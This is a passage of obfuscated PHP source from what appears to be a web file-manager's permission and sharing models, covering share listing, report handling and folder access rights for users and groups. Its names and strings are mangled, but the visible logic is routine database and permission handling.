$×¼ƒºæ” = $ğÅ•Ó[$¢îÒèÃñ[854]] ? $ğÅ•Ó[$¢îÒèÃñ[854]] : strtotime(date($¢îÒèÃñ[2304])); $ãÈ¢ÅÃ¶[$¢îÒèÃñ[232]] = array($¢îÒèÃñ[409], array($ğÅ•Ó[$¢îÒèÃñ[853]], $×¼ƒºæ”)); } if (isset($ğÅ•Ó[$¢îÒèÃñ[33]]) && in_array($ğÅ•Ó[$¢îÒèÃñ[33]], array($¢îÒèÃñ[91], $¢îÒèÃñ[520], $¢îÒèÃñ[2307], $¢îÒèÃñ[2308], $¢îÒèÃñ[2309]))) { $ãÈ¢ÅÃ¶[$¢îÒèÃñ[33]] = $ğÅ•Ó[$¢îÒèÃñ[33]]; } if (isset($ğÅ•Ó[$¢îÒèÃñ[842]]) && in_array($ğÅ•Ó[$¢îÒèÃñ[842]], array($¢îÒèÃñ[229], $¢îÒèÃñ[91], $¢îÒèÃñ[520], $¢îÒèÃñ[2307]))) { $ãÈ¢ÅÃ¶[$¢îÒèÃñ[842]] = $ğÅ•Ó[$¢îÒèÃñ[842]]; } $É±šäõ£ = Input::get($¢îÒèÃñ[541], $¢îÒèÃñ[7], $¢îÒèÃñ[2306], array($¢îÒèÃñ[2224], $¢îÒèÃñ[535])); $êË™¸’è = array($¢îÒèÃñ[533] => $¢îÒèÃñ[534], $¢îÒèÃñ[535] => $¢îÒèÃñ[536]); $¢¥²ßÜ = $¢îÒèÃñ[2310] . $êË™¸’è[$É±šäõ£]; $¸ôÂËËƒ = Model($¢îÒèÃñ[2301])->where($ãÈ¢ÅÃ¶)->order($¢¥²ßÜ)->selectPage(20); if (empty($¸ôÂËËƒ[$¢îÒèÃñ[446]])) { return array(); } $ôŞ¬™Ø» = array_to_keyvalue_group($¸ôÂËËƒ[$¢îÒèÃñ[446]], $¢îÒèÃñ[842], $¢îÒèÃñ[684]); if (!empty($ôŞ¬™Ø»[0])) { $ğÅ•Ó = $ôŞ¬™Ø»[0]; $ãÈ¢ÅÃ¶ = array($¢îÒèÃñ[684] => array($¢îÒèÃñ[7], $ğÅ•Ó)); $€…´«ƒ‹ = $this->where($ãÈ¢ÅÃ¶)->field($¢îÒèÃñ[684])->select(); $€…´«ƒ‹ = array_to_keyvalue($€…´«ƒ‹, $¢îÒèÃñ[12], $¢îÒèÃñ[684]); $°Î—îÕ” = array_diff($ğÅ•Ó, $€…´«ƒ‹); if (!empty($°Î—îÕ”)) { foreach ($¸ôÂËËƒ[$¢îÒèÃñ[446]] as $™Úí»– => $çôÓ‘öÁ) { if (in_array($çôÓ‘öÁ[$¢îÒèÃñ[684]], $°Î—îÕ”)) { unset($¸ôÂËËƒ[$¢îÒèÃñ[446]][$™Úí»–]); } } } } $this->_listDataApply($¸ôÂËËƒ[$¢îÒèÃñ[446]]); return $¸ôÂËËƒ; } public function reportStatus($Ç¢–ê°Œ) { $˜®óÌò¦ =& $_SERVER[öæÛ¿©¿]; $ÁîËÍÎ = array($˜®óÌò¦[483] => $Ç¢–ê°Œ[$˜®óÌò¦[483]]); $Ø²ó÷ô· = Model($˜®óÌò¦[2301])->where($ÁîËÍÎ)->field($˜®óÌò¦[2311])->find(); if (!$Ø²ó÷ô·) { return !1; } $–äã×Ñß = array($˜®óÌò¦[842] => $Ç¢–ê°Œ[$˜®óÌò¦[842]]); if ($Ç¢–ê°Œ[$˜®óÌò¦[842]] == $˜®óÌò¦[2307] && $Ø²ó÷ô·[$˜®óÌò¦[842]] == $˜®óÌò¦[2307]) { $–äã×Ñß[$˜®óÌò¦[842]] = 0; } $ÏêäÏÜ = Model($˜®óÌò¦[2301])->where($ÁîËÍÎ)->save($–äã×Ñß); if ($Ç¢–ê°Œ[$˜®óÌò¦[842]] == $˜®óÌò¦[520]) { if ($Ø²ó÷ô·[$˜®óÌò¦[553]] != $˜®óÌò¦[229] && $this->shareFileMeta($Ø²ó÷ô·[$˜®óÌò¦[553]])) { $this->shareFileMeta($Ø²ó÷ô·[$˜®óÌò¦[553]], 0); } $this->remove($Ø²ó÷ô·[$˜®óÌò¦[684]]); return !0; } if ($ÏêäÏÜ && $Ç¢–ê°Œ[$˜®óÌò¦[842]] == $˜®óÌò¦[2307]) { $ã¯ ì¦— = $–äã×Ñß[$˜®óÌò¦[842]] == $˜®óÌò¦[2307] ? 1 : 0; $this->shareFileMeta($Ø²ó÷ô·[$˜®óÌò¦[553]], $ã¯ ì¦—); $this->removeByFile($Ø²ó÷ô·[$˜®óÌò¦[553]]); } return $ÏêäÏÜ; } private function removeByFile($˜àœûÒõ) { $Ã¸ˆŒ§ú =& $_SERVER[öæÛ¿©¿]; $é¤Î±œ§ = Model($Ã¸ˆŒ§ú[925])->where(array($Ã¸ˆŒ§ú[553] => $˜àœûÒõ))->field($Ã¸ˆŒ§ú[192])->select(); $ˆ™¢ğ£û = array_to_keyvalue($é¤Î±œ§, $Ã¸ˆŒ§ú[12], $Ã¸ˆŒ§ú[192]); $œÀ¤éêÉ = array($Ã¸ˆŒ§ú[192] => array($Ã¸ˆŒ§ú[7], $ˆ™¢ğ£û), $Ã¸ˆŒ§ú[574] => 1); $é¤Î±œ§ = $this->where($œÀ¤éêÉ)->field($Ã¸ˆŒ§ú[684])->select(); if (empty($é¤Î±œ§)) { return; } $†‰ò™äË = array_to_keyvalue($é¤Î±œ§, $Ã¸ˆŒ§ú[12], $Ã¸ˆŒ§ú[684]); $this->remove($†‰ò™äË); } private function shareFileMeta($œÌœ™”´, $•œÖØİ„ = null) { $×¨«ñ»Ù =& $_SERVER[öæÛ¿©¿]; $•Ä²ËÕç = array($×¨«ñ»Ù[553] => $œÌœ™”´, $×¨«ñ»Ù[95] => $×¨«ñ»Ù[2312]); if (is_null($•œÖØİ„)) { return Model($×¨«ñ»Ù[2313])->where($•Ä²ËÕç)->find(); } $•Ä²ËÕç[$×¨«ñ»Ù[451]] = $•œÖØİ„; Model($×¨«ñ»Ù[2313])->add($•Ä²ËÕç, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\145\x5f\x61\x75\164\x68"; public function getAuth($÷ÊÎ‡™) { $²¼ôéÉí =& $_SERVER[öæÛ¿©¿]; $¯çêò ÷ = $this->sourceAuthSelect($÷ÊÎ‡™); $Øã—ùİ‘ = array(); $èêîÅë° = array(); $Ğáå—Ú = 2 << 25; foreach ($¯çêò ÷ as $¨Ğ¸Ùçİ) { $ÇÓÙİæ = Model($²¼ôéÉí[587])->listData($¨Ğ¸Ùçİ[$²¼ôéÉí[1585]]); if (!$ÇÓÙİæ) { continue; } $Øã—ùİ‘[] = $¨Ğ¸Ùçİ; $ªâ¿»Å— = 0; if ($¨Ğ¸Ùçİ[$²¼ôéÉí[189]] == SourceModel::TYPE_GROUP) { $ªâ¿»Å— = $Ğáå—Ú * 2; } if ($¨Ğ¸Ùçİ[$²¼ôéÉí[189]] == SourceModel::TYPE_USER) { $ªâ¿»Å— = $Ğáå—Ú; } if ($¨Ğ¸Ùçİ[$²¼ôéÉí[189]] == SourceModel::TYPE_USER && $¨Ğ¸Ùçİ[$²¼ôéÉí[585]] == $²¼ôéÉí[229]) { $ªâ¿»Å— = 0; } $èêîÅë°[] = $ÇÓÙİæ[$²¼ôéÉí[498]] + $ªâ¿»Å—; } array_multisort($èêîÅë°, SORT_DESC, $Øã—ùİ‘); return $Øã—ùİ‘; } public function sourceAuthSelect($·¨æ’Èà) { $–Ì²ŠÓ· =& $_SERVER[öæÛ¿©¿]; static $½¥Êªˆ = array(); $ÏÊÔÔíğ = is_array($·¨æ’Èà) ? !1 : !0; if ($ÏÊÔÔíğ) { $·¨æ’Èà = array($·¨æ’Èà); } $‡¼‘Üß = array(); foreach ($·¨æ’Èà as $úæ’ìÀ‚) { if (isset($½¥Êªˆ[$úæ’ìÀ‚])) { $‡¼‘Üß[$úæ’ìÀ‚] = $½¥Êªˆ[$úæ’ìÀ‚]; } } if (count($‡¼‘Üß) == count($·¨æ’Èà)) { return $ÏÊÔÔíğ ? $‡¼‘Üß[$·¨æ’Èà[0]] : $‡¼‘Üß; } $Ä¸ÓÔëç = $–Ì²ŠÓ·[2314]; $¯Ò¦ûÁ = array($–Ì²ŠÓ·[192] => array($–Ì²ŠÓ·[7], $·¨æ’Èà)); $Îû„Ê• = $this->field($Ä¸ÓÔëç)->order($–Ì²ŠÓ·[483])->where($¯Ò¦ûÁ)->select(); $ğ®‹ç„³ = array_to_keyvalue_group($Îû„Ê•, $–Ì²ŠÓ·[192]); foreach ($·¨æ’Èà as $úæ’ìÀ‚) { $½¥Êªˆ[$úæ’ìÀ‚] = $ğ®‹ç„³[$úæ’ìÀ‚] ? $ğ®‹ç„³[$úæ’ìÀ‚] : array(); } if ($ÏÊÔÔíğ) { return $Îû„Ê•; } return $ğ®‹ç„³; } public function setAuth($Ö¿æ¼ê, $ôŸÚ¡ı÷) { $úºÔŒ«Ñ =& $_SERVER[öæÛ¿©¿]; $°·¨éİ¿ = Model($úºÔŒ«Ñ[1478])->sourceInfo($Ö¿æ¼ê); if (!$°·¨éİ¿) { return !1; } if ($°·¨éİ¿[$úºÔŒ«Ñ[189]] != SourceModel::TYPE_GROUP) { return !1; } $á¯û£½µ = 1; $ÌÛ»›ú = $°·¨éİ¿[$úºÔŒ«Ñ[585]]; if ($ÌÛ»›ú != $á¯û£½µ) { $è¥à»Šû = array($úºÔŒ«Ñ[1440] => $ÌÛ»›ú); $¶îİ§‡Ï = Model($úºÔŒ«Ñ[2223])->field($úºÔŒ«Ñ[1538])->where($è¥à»Šû)->select(); $¶îİ§‡Ï = array_to_keyvalue($¶îİ§‡Ï, $úºÔŒ«Ñ[12], $úºÔŒ«Ñ[1538]); } $ÜËŠœÆ– = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Çˆ±¢­ = array(); foreach ($ôŸÚ¡ı÷ as $ºÕ«¢©) { if (!in_array($ºÕ«¢©[$úºÔŒ«Ñ[189]], $ÜËŠœÆ–)) { show_json(LNG($úºÔŒ«Ñ[2315]), !1); } if ($ÌÛ»›ú != $á¯û£½µ) { if ($ºÕ«¢©[$úºÔŒ«Ñ[189]] == SourceModel::TYPE_GROUP) { } if ($ºÕ«¢©[$úºÔŒ«Ñ[585]] != 0 && !in_array($ºÕ«¢©[$úºÔŒ«Ñ[585]], $¶îİ§‡Ï)) { } } if ($ºÕ«¢©[$úºÔŒ«Ñ[585]] == 0) { $ºÕ«¢©[$úºÔŒ«Ñ[189]] = SourceModel::TYPE_USER; } $Çˆ±¢­[] = array($úºÔŒ«Ñ[192] => $Ö¿æ¼ê, $úºÔŒ«Ñ[189] => intval($ºÕ«¢©[$úºÔŒ«Ñ[189]]), $úºÔŒ«Ñ[585] => intval($ºÕ«¢©[$úºÔŒ«Ñ[585]]), $úºÔŒ«Ñ[1585] => intval($ºÕ«¢©[$úºÔŒ«Ñ[1585]]) ? intval($ºÕ«¢©[$úºÔŒ«Ñ[1585]]) : 0, $úºÔŒ«Ñ[2293] => intval($ºÕ«¢©[$úºÔŒ«Ñ[2293]]) ? intval($ºÕ«¢©[$úºÔŒ«Ñ[2293]]) : -1); } $this->where(array($úºÔŒ«Ñ[502] => $Ö¿æ¼ê))->delete(); $this->addAll($Çˆ±¢­); return !0; } public function authClear($±ç‰ŠÂ) { $Œ¢æï¡Á =& $_SERVER[öæÛ¿©¿]; $æİ”Ûí¶ = Model($Œ¢æï¡Á[1478])->sourceInfo($±ç‰ŠÂ); $ËÉÉêçœ = array($±ç‰ŠÂ); if ($æİ”Ûí¶[$Œ¢æï¡Á[496]] == $Œ¢æï¡Á[91]) { $ş´Ù´İ· = array($Œ¢æï¡Á[671] => array($Œ¢æï¡Á[631], $æİ”Ûí¶[$Œ¢æï¡Á[600]] . $±ç‰ŠÂ . $Œ¢æï¡Á[632])); $ËÉÉêçœ = Model($Œ¢æï¡Á[1478])->field($Œ¢æï¡Á[502])->where($ş´Ù´İ·)->getField($Œ¢æï¡Á[192], !0); $ËÉÉêçœ[] = $±ç‰ŠÂ; } $this->where(array($Œ¢æï¡Á[502] => array($Œ¢æï¡Á[503], $ËÉÉêçœ)))->delete(); return !0; } public function getAllParent($é“«°ôÓ) { $‰€Œœ¡œ =& $_SERVER[öæÛ¿©¿]; $¥Ñ‚Æ¯¢ = Model($‰€Œœ¡œ[1478])->sourceInfo($é“«°ôÓ); if (!$¥Ñ‚Æ¯¢ || $¥Ñ‚Æ¯¢[$‰€Œœ¡œ[189]] != SourceModel::TYPE_GROUP) { return array(); } $ß…ÖçÕ« = Model($‰€Œœ¡œ[1478])->parentLevelArray($¥Ñ‚Æ¯¢[$‰€Œœ¡œ[600]]); $Å¿Ÿ‚Íñ = array_merge(array(intval($é“«°ôÓ)), array_reverse($ß…ÖçÕ«)); $Ñ˜¢¥¶¾ = $this->sourceAuthSelect($Å¿Ÿ‚Íñ); $•€‘«Ëô = $GLOBALS[$‰€Œœ¡œ[6]][$‰€Œœ¡œ[92]][$‰€Œœ¡œ[2236]] == 1; $ºş²ßç× = $•€‘«Ëô ? 3 : 2; $Ç…±³ªÑ = Model($‰€Œœ¡œ[1438])->getInfo($¥Ñ‚Æ¯¢[$‰€Œœ¡œ[585]]); $×šĞ‡¡ = explode($‰€Œœ¡œ[50], trim($Ç…±³ªÑ[$‰€Œœ¡œ[600]], $‰€Œœ¡œ[50])); $âĞ‚Ìø× = array_merge(array($Ç…±³ªÑ[$‰€Œœ¡œ[1440]]), array_reverse(array_slice($×šĞ‡¡, $ºş²ßç×))); foreach ($Ñ˜¢¥¶¾ as $é“«°ôÓ => $ş¬õ“¸) { foreach ($ş¬õ“¸ as $›–Ù§¹ï) { if (!$›–Ù§¹ï || !$›–Ù§¹ï[$‰€Œœ¡œ[585]] || $›–Ù§¹ï[$‰€Œœ¡œ[585]] == $‰€Œœ¡œ[229]) { continue; } if ($›–Ù§¹ï[$‰€Œœ¡œ[189]] != SourceModel::TYPE_GROUP) { continue; } $âĞ‚Ìø×[] = $›–Ù§¹ï[$‰€Œœ¡œ[585]]; } } $âĞ‚Ìø× = array_unique($âĞ‚Ìø×); $—¨‰Â = array($‰€Œœ¡œ[429] => _get($GLOBALS[$‰€Œœ¡œ[7]], $‰€Œœ¡œ[429], 1), $‰€Œœ¡œ[440] => _get($GLOBALS[$‰€Œœ¡œ[7]], $‰€Œœ¡œ[440], 500)); $GLOBALS[$‰€Œœ¡œ[7]][$‰€Œœ¡œ[429]] = 1; $GLOBALS[$‰€Œœ¡œ[7]][$‰€Œœ¡œ[440]] = 500; $¬½ÑöÆò = array($‰€Œœ¡œ[504] => 0, $‰€Œœ¡œ[2137] => AuthModel::authAll(), $‰€Œœ¡œ[505] => LNG($‰€Œœ¡œ[2316]), $‰€Œœ¡œ[2152] => $‰€Œœ¡œ[2317]); $Ï…‡’«— = array(); $ºÖÉİ«• = explode($‰€Œœ¡œ[50], $‰€Œœ¡œ[2318]); $Ì¾Øì¬ì = explode($‰€Œœ¡œ[50], $‰€Œœ¡œ[2319]); foreach ($âĞ‚Ìø× as $øœÇå“) { $áê™Î = Model($‰€Œœ¡œ[1438])->getInfo($øœÇå“); $üåĞåÑ = array_field_key($áê™Î, $ºÖÉİ«•); $ò‰ÇÈËÔ = Model($‰€Œœ¡œ[613])->listByGroup($øœÇå“); foreach ($ò‰ÇÈËÔ[$‰€Œœ¡œ[446]] as $ŠìÁ—ê => $¢²Œ) { $this->userGroupList($¢²Œ[$‰€Œœ¡œ[1538]], $¢²Œ); $é•ŞÙçŞ = $¢²Œ[$‰€Œœ¡œ[1538]] . $‰€Œœ¡œ[12]; if (isset($Ï…‡’«—[$é•ŞÙçŞ])) { continue; } $Åµí×Ñ— = Model($‰€Œœ¡œ[2320])->listData($¢²Œ[$‰€Œœ¡œ[2321]]); $¢²Œ[$‰€Œœ¡œ[2322]] = Action($‰€Œœ¡œ[2323])->parseUrl($¢²Œ[$‰€Œœ¡œ[2322]]); $¢²Œ[$‰€Œœ¡œ[1890]] = $Åµí×Ñ— && $Åµí×Ñ—[$‰€Œœ¡œ[2324]] == 1; $¾šíœ÷ = $this->groupRootAuth($øœÇå“, $¢²Œ[$‰€Œœ¡œ[1538]]); $¾šíœ÷ = $¢²Œ[$‰€Œœ¡œ[1890]] ? $¬½ÑöÆò : $¾šíœ÷; $Ï…‡’«—[$é•ŞÙçŞ] = array($‰€Œœ¡œ[2325] => $‰€Œœ¡œ[2326], $‰€Œœ¡œ[2327] => LNG($‰€Œœ¡œ[2328]), $‰€Œœ¡œ[2305] => array_field_key($¢²Œ, $Ì¾Øì¬ì), $‰€Œœ¡œ[498] => $¾šíœ÷, $‰€Œœ¡œ[499] => $¾šíœ÷[$‰€Œœ¡œ[498]], $‰€Œœ¡œ[2329] => $üåĞåÑ); } } $GLOBALS[$‰€Œœ¡œ[7]][$‰€Œœ¡œ[429]] = $—¨‰Â[$‰€Œœ¡œ[429]]; $GLOBALS[$‰€Œœ¡œ[7]][$‰€Œœ¡œ[440]] = $—¨‰Â[$‰€Œœ¡œ[440]]; foreach ($Ñ˜¢¥¶¾ as $é“«°ôÓ => $ş¬õ“¸) { if (!$ş¬õ“¸) { continue; } foreach ($ş¬õ“¸ as $›–Ù§¹ï) { if (!$›–Ù§¹ï || !$›–Ù§¹ï[$‰€Œœ¡œ[585]] || $›–Ù§¹ï[$‰€Œœ¡œ[585]] == $‰€Œœ¡œ[229]) { continue; } if ($›–Ù§¹ï[$‰€Œœ¡œ[189]] != SourceModel::TYPE_USER) { continue; } $é•ŞÙçŞ = $›–Ù§¹ï[$‰€Œœ¡œ[585]] . $‰€Œœ¡œ[12]; if (isset($Ï…‡’«—[$é•ŞÙçŞ])) { continue; } $³—½ÇÁø = $this->authMake($ş¬õ“¸, $é•ŞÙçŞ); if (!$³—½ÇÁø || !$³—½ÇÁø[$‰€Œœ¡œ[2327]]) { continue; } $Ï…‡’«—[$é•ŞÙçŞ] = array($‰€Œœ¡œ[2325] => $‰€Œœ¡œ[2330], $‰€Œœ¡œ[2327] => $³—½ÇÁø[$‰€Œœ¡œ[2327]], $‰€Œœ¡œ[2305] => Model($‰€Œœ¡œ[613])->getInfoSimpleOuter($é•ŞÙçŞ), $‰€Œœ¡œ[498] => $³—½ÇÁø[$‰€Œœ¡œ[552]], $‰€Œœ¡œ[499] => $³—½ÇÁø[$‰€Œœ¡œ[552]][$‰€Œœ¡œ[498]], $‰€Œœ¡œ[2329] => $³—½ÇÁø[$‰€Œœ¡œ[2331]]); } } foreach ($Ñ˜¢¥¶¾ as $é“«°ôÓ => $ş¬õ“¸) { if (!$ş¬õ“¸) { continue; } foreach ($Ï…‡’«— as $é•ŞÙçŞ => $ã·‹ôíª) { if ($ã·‹ôíª[$‰€Œœ¡œ[2305]][$‰€Œœ¡œ[1890]] || $ã·‹ôíª[$‰€Œœ¡œ[2325]] == $‰€Œœ¡œ[2330]) { continue; } $³—½ÇÁø = $this->authMake($ş¬õ“¸, $é•ŞÙçŞ); if (!$³—½ÇÁø || !$³—½ÇÁø[$‰€Œœ¡œ[2327]]) { continue; } $Ï…‡’«—[$é•ŞÙçŞ] = array($‰€Œœ¡œ[2325] => $‰€Œœ¡œ[2330], $‰€Œœ¡œ[2327] => $³—½ÇÁø[$‰€Œœ¡œ[2327]], $‰€Œœ¡œ[2305] => $ã·‹ôíª[$‰€Œœ¡œ[2305]], $‰€Œœ¡œ[498] => $³—½ÇÁø[$‰€Œœ¡œ[552]], $‰€Œœ¡œ[499] => $³—½ÇÁø[$‰€Œœ¡œ[552]][$‰€Œœ¡œ[498]], $‰€Œœ¡œ[2329] => $³—½ÇÁø[$‰€Œœ¡œ[2331]]); } } $Ï…‡’«— = array_sort_by($Ï…‡’«—, $‰€Œœ¡œ[499], $‰€Œœ¡œ[536]); return $Ï…‡’«—; } public function getAllChildren($”Ï”Ï‚Ö) { $µëÃÔ… =& $_SERVER[öæÛ¿©¿]; $ùÛñò÷Ô = Model($µëÃÔ…[1478])->sourceInfo($”Ï”Ï‚Ö); if ($ùÛñò÷Ô[$µëÃÔ…[496]] != $µëÃÔ…[91]) { return $this->sourceListAuth(array($”Ï”Ï‚Ö)); } if ($ùÛñò÷Ô[$µëÃÔ…[189]] != SourceModel::TYPE_GROUP) { return array(); } $µ×·â¥ = 1; $¸îêº°î = array($”Ï”Ï‚Ö); if ($ùÛñò÷Ô[$µëÃÔ…[191]] == $µëÃÔ…[229] && $ùÛñò÷Ô[$µëÃÔ…[585]] != $µ×·â¥) { $¸îêº°î = $this->groupChidldAllRootSource($ùÛñò÷Ô[$µëÃÔ…[585]]); } $Ìú½á«Ç = $this->field($µëÃÔ…[192])->group($µëÃÔ…[192])->select(); $Ìú½á«Ç = array_to_keyvalue($Ìú½á«Ç, $µëÃÔ…[12], $µëÃÔ…[192]); if (!$Ìú½á«Ç) { return array(); } $…Ô¿ƒì‹ = $µëÃÔ…[2332]; $íƒ…âÊˆ = array($µëÃÔ…[192] => array($µëÃÔ…[7], $Ìú½á«Ç), $µëÃÔ…[516] => $µëÃÔ…[229]); $šß±¾‡â = Model($µëÃÔ…[925])->field($…Ô¿ƒì‹)->where($íƒ…âÊˆ)->select(); $¼ªÌŠ’Æ = array($”Ï”Ï‚Ö); foreach ($šß±¾‡â as $Í¦©Úß”) { foreach ($¸îêº°î as $¬°® ¤İ) { $ëàÉ÷³§ = $µëÃÔ…[50] . $¬°® ¤İ . $µëÃÔ…[50]; $¹›Á±æé = $Í¦©Úß”[$µëÃÔ…[600]] . $Í¦©Úß”[$µëÃÔ…[192]] . $µëÃÔ…[50]; if (strstr($¹›Á±æé, $ëàÉ÷³§)) { $¼ªÌŠ’Æ[] = $Í¦©Úß”[$µëÃÔ…[192]]; break; } } } return $this->sourceListAuth($¼ªÌŠ’Æ); } private function sourceListAuth($›ıîÛÓ”) { $Í»¬ğé€ =& $_SERVER[öæÛ¿©¿]; $šıÇÃÅş = Model($Í»¬ğé€[1478])->sourceListInfo($›ıîÛÓ”, !0); $ƒÀÔìÕ“ = $this->sourceAuthSelect($›ıîÛÓ”); $«Äã•â = array(); $Ù‹¥Õ‹Ş = array(); foreach ($šıÇÃÅş as $š—…Ù) { unset($š—…Ù[$Í»¬ğé€[539]]); unset($š—…Ù[$Í»¬ğé€[537]]); unset($š—…Ù[$Í»¬ğé€[498]]); unset($š—…Ù[$Í»¬ğé€[90]]); $…¢Åô¾ = $ƒÀÔìÕ“[$š—…Ù[$Í»¬ğé€[192]]]; if (!$…¢Åô¾) { continue; } $š—…Ù[$Í»¬ğé€[2329]] = $this->authTargetInfo($…¢Åô¾); $š—…Ù[$Í»¬ğé€[598]] = rtrim($š—…Ù[$Í»¬ğé€[604]], $Í»¬ğé€[8]) . $Í»¬ğé€[8] . ltrim($š—…Ù[$Í»¬ğé€[598]], $Í»¬ğé€[8]); $«Äã•â[] = $š—…Ù; $™ëã½êº = count(explode($Í»¬ğé€[8], trim($š—…Ù[$Í»¬ğé€[598]], $Í»¬ğé€[8]))); $Ù‹¥Õ‹Ş[] = $™ëã½êº + ($š—…Ù[$Í»¬ğé€[33]] == $Í»¬ğé€[78] ? 0 : 1000); } array_multisort($Ù‹¥Õ‹Ş, SORT_ASC, $«Äã•â); return $«Äã•â; } private function groupChidldAllRootSource($ÕÅËßä‚) { $—Ğ¿¢è =& $_SERVER[öæÛ¿©¿]; $èÁ¾÷İˆ = Model($—Ğ¿¢è[1438])->groupChildrenAll($ÕÅËßä‚); $ÁÜóóÅú = array($—Ğ¿¢è[191] => 0, $—Ğ¿¢è[585] => array($—Ğ¿¢è[7], $èÁ¾÷İˆ), $—Ğ¿¢è[189] => SourceModel::TYPE_GROUP); $ò¿«İÛ = Model($—Ğ¿¢è[925])->field($—Ğ¿¢è[192])->where($ÁÜóóÅú)->select(); $ò¿«İÛ = array_to_keyvalue($ò¿«İÛ, $—Ğ¿¢è[12], $—Ğ¿¢è[192]); return $ò¿«İÛ; } private function authTargetInfo($Øğˆ‹ª•) { $ı«˜æˆ± =& $_SERVER[öæÛ¿©¿]; $Éä¢»Ûî = array(); $·´†Ç™ô = array(); $ÒÈıÆÉ = 2 << 25; foreach ($Øğˆ‹ª• as $ÃÙŸ‡Œ–) { $çş´’á = Model($ı«˜æˆ±[587])->listData($ÃÙŸ‡Œ–[$ı«˜æˆ±[1585]]); if (!$çş´’á) { continue; } if ($ÃÙŸ‡Œ–[$ı«˜æˆ±[189]] == SourceModel::TYPE_USER) { $µÃõ½ôö = Model($ı«˜æˆ±[593])->getInfoSimpleOuter($ÃÙŸ‡Œ–[$ı«˜æˆ±[585]]); if ($µÃõ½ôö[$ı«˜æˆ±[1538]] == $ı«˜æˆ±[1322]) { continue; } if ($µÃõ½ôö[$ı«˜æˆ±[1538]] == $ı«˜æˆ±[229]) { $µÃõ½ôö[$ı«˜æˆ±[32]] = LNG($ı«˜æˆ±[2333]); } } else { $µÃõ½ôö = Model($ı«˜æˆ±[601])->getInfoSimple($ÃÙŸ‡Œ–[$ı«˜æˆ±[585]]); } if (!$µÃõ½ôö) { continue; } $µÃõ½ôö[$ı«˜æˆ±[552]] = $çş´’á; $Éä¢»Ûî[] = $µÃõ½ôö; $ÂÙ¾£ÌÇ = 0; if ($ÃÙŸ‡Œ–[$ı«˜æˆ±[189]] == SourceModel::TYPE_GROUP) { $ÂÙ¾£ÌÇ = $ÒÈıÆÉ * 2; } if ($ÃÙŸ‡Œ–[$ı«˜æˆ±[189]] == SourceModel::TYPE_USER) { $ÂÙ¾£ÌÇ = $ÒÈıÆÉ; } if ($ÃÙŸ‡Œ–[$ı«˜æˆ±[189]] == SourceModel::TYPE_USER && $ÃÙŸ‡Œ–[$ı«˜æˆ±[585]] == $ı«˜æˆ±[229]) { $ÂÙ¾£ÌÇ = 0; } $·´†Ç™ô[] = $çş´’á[$ı«˜æˆ±[498]] + $ÂÙ¾£ÌÇ; } array_multisort($·´†Ç™ô, SORT_DESC, $Éä¢»Ûî); return $Éä¢»Ûî; } public function getAllChildrenByUser($÷ç¥‹ò©, $ı¿¥™¦¶) { $ƒëííÒ¤ =& $_SERVER[öæÛ¿©¿]; $÷˜ûÌÛÖ = Model($ƒëííÒ¤[613])->getInfo($ı¿¥™¦¶); if (!$ı¿¥™¦¶ || !$÷ç¥‹ò© || !$÷˜ûÌÛÖ) { return array(); } $ØóñÁéŸ = Model($ƒëííÒ¤[1478])->sourceInfo($÷ç¥‹ò©); $ÕÜ˜©” = array(); $”­ç±Ì = 1; if ($ØóñÁéŸ[$ƒëííÒ¤[191]] == $ƒëííÒ¤[229] && $ØóñÁéŸ[$ƒëííÒ¤[585]] != $”­ç±Ì && $this->groupContainUser($ØóñÁéŸ[$ƒëííÒ¤[585]], $ı¿¥™¦¶)) { foreach ($÷˜ûÌÛÖ[$ƒëííÒ¤[1439]] as $‹µºÀ´”) { $éæ£¢‚ = Model($ƒëííÒ¤[601])->getInfo($‹µºÀ´”[$ƒëííÒ¤[1440]]); $Éìôó˜ß = Model($ƒëííÒ¤[613])->getInfoSimpleOuter($ı¿¥™¦¶); $Éìôó˜ß[$ƒëííÒ¤[552]] = $‹µºÀ´”[$ƒëííÒ¤[498]]; if (Model($ƒëííÒ¤[587])->authCheckAction($‹µºÀ´”[$ƒëííÒ¤[498]][$ƒëííÒ¤[498]], $ƒëííÒ¤[1510])) { continue; } $¡‰¬¶÷§ = array($ƒëííÒ¤[32] => $ƒëííÒ¤[1341] . $éæ£¢‚[$ƒëííÒ¤[32]], $ƒëííÒ¤[192] => $éæ£¢‚[$ƒëííÒ¤[90]][$ƒëííÒ¤[192]], $ƒëííÒ¤[87] => KodIO::make($éæ£¢‚[$ƒëííÒ¤[90]][$ƒëííÒ¤[192]]), $ƒëííÒ¤[191] => $ƒëííÒ¤[229], $ƒëííÒ¤[189] => $ƒëííÒ¤[594], $ƒëííÒ¤[33] => $ƒëííÒ¤[635], $ƒëííÒ¤[598] => $éæ£¢‚[$ƒëííÒ¤[605]], $ƒëííÒ¤[1440] => $éæ£¢‚[$ƒëííÒ¤[1440]], $ƒëííÒ¤[602] => $éæ£¢‚[$ƒëííÒ¤[191]], $ƒëííÒ¤[2329] => array($Éìôó˜ß)); $ÕÜ˜©”[$¡‰¬¶÷§[$ƒëííÒ¤[192]]] = $¡‰¬¶÷§; } } $ê†Õãíş = array(); $úÆÃàâì = $this->getAllChildren($÷ç¥‹ò©); foreach ($úÆÃàâì as $Æ‚©ï…¼) { $Âš˜» = !1; foreach ($Æ‚©ï…¼[$ƒëííÒ¤[2329]] as $Ç¡ó¯ ) { if ($Ç¡ó¯ [$ƒëííÒ¤[1538]]) { if ($Ç¡ó¯ [$ƒëííÒ¤[1538]] == $ı¿¥™¦¶) { $Âš˜» = !0; break; } } if ($Ç¡ó¯ [$ƒëííÒ¤[1440]]) { if ($this->groupContainUser($Ç¡ó¯ [$ƒëííÒ¤[1440]], $ı¿¥™¦¶)) { $Âš˜» = !0; break; } } } if ($Âš˜») { $ê†Õãíş[] = $Æ‚©ï…¼; } $Úòİ˜» = $Æ‚©ï…¼[$ƒëííÒ¤[192]]; if (isset($ÕÜ˜©”[$Úòİ˜»])) { $Æ‚©ï…¼[$ƒëííÒ¤[2329]][] = $ÕÜ˜©”[$Úòİ˜»][0]; $ÕÜ˜©”[$Úòİ˜»] = !1; } } $ÕÜ˜©” = array_filter(array_values($ÕÜ˜©”)); $ê†Õãíş = array_merge($ÕÜ˜©”, $ê†Õãíş); return $ê†Õãíş; } public function setAllChildrenByUser($½Õèßˆ×, $Ö‚ÂÒ‰ß, $ªëğ´Ï¼) { $éÚôñ”¸ =& $_SERVER[öæÛ¿©¿]; $Ìø©ñé = $this->getAllChildrenByUser($½Õèßˆ×, 